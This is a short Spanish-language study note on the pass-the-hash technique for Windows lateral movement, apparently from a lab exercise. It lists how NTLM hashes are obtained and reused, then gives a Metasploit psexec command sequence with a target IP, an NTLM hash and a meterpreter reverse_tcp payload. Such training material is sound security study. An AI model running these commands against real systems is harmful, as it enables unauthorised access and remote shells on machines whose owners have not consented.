
Es una Técnica utilizada para ataques de movimiento lateral donde el atacante utiliza el hash de una contraseña (comúmente el NTLM) sin necesitar utilizar la contraseña en texto plano.

Técnica especialmente relevante para windows, donde el NTLM sigue siendo soportado por compatibilidad con sistemas más antiguos.

Este tipo de ataque nos permite hacernos pasar por usuarios, ganando acceso y realizando movimientos laterales. 

Pasos a realizar:

1. Objetener el Hash
	1. Ataques mediante dumps de credenciales, scraping de memoria o capturando tráfico.
	2. Herramientas como Mimikatz, Hashcat o metasploit pueden ser usadas para extraer NTLM hashes.
2. Usar NTLM hashes para autenticarse
	1. Una vez el atacante tiene un NTLM hash puede usarse para autenticarse en otro sistema.
3. Conectarse a sistemas remotos
	1. Utilizar el hash NTLM para conectarse a sistemas remotos utilizando protocolos comunes como SMB, WMI, RDP...

## Con Metaspoit

Nos dan la ip víctima -> 10.4.29.129

Y el NTML hash.

![[Pasted image 20250303093202.png]]

```bash
#Inicio del metasploit en modo quiet.
msfconsole -q

#Vamos a utilzar el módulo para SMB
search psexec
use exploit/windows/smb/psexec

set RHOST 10.4.29.129
set SMBUser administrator
#Poner el NTLMHAsh que nos dan
set SMBPass 0000000000000000000000000000000:5c4d59391f656d5958dab124ffeabc20
set payload /windows/x64/meterpreter/reverse_tcp

exploit
```


![[Pasted image 20250303093542.png]]


